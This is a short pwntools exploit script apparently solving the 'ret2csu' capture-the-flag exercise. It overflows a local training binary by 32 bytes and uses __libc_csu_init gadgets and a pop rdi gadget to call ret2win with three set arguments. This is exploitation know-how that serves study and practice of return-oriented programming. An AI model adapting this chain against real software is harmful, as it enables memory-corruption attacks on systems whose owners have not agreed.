from pwn import *

context.update(arch='amd64', log_level='debug')

elf = ELF('./ret2csu')
rop = ROP(elf)
io = process(elf.path)

csugadget1 = 0x40069a 
csugadget2 = 0x400680 

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
win = elf.symbols['ret2win'] 
_init = next(elf.search(p64(elf.symbols['_init'])))

payload = flat([
    b'A' * 32,          # offset = 32
    b'FAKE_RBP',        # fake rbp
    csugadget1,         # 
    0,                  # rbx
    1,                  # rbp 
    _init,              # r12
    0,                  # r13 
    0xcafebabecafebabe, # r14 (rsi -> 0xcafebabecafebabe)  
    0xd00df00dd00df00d, # r15 (rdx -> 0xd00df00dd00df00d)
    csugadget2,         #
    0,                  # add rsp, 8 
    0,                  # rbx
    0,                  # rbp  
    0,                  # r12  
    0,                  # r13  
    0,                  # r14  
    0,                  # r15  
    pop_rdi,            # 
    0xdeadbeefdeadbeef, # rdi -> 0xdeadbeefdeadbeef
    win                 # ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
])

io.recvuntil(b'>')
io.sendline(payload)
io.interactive()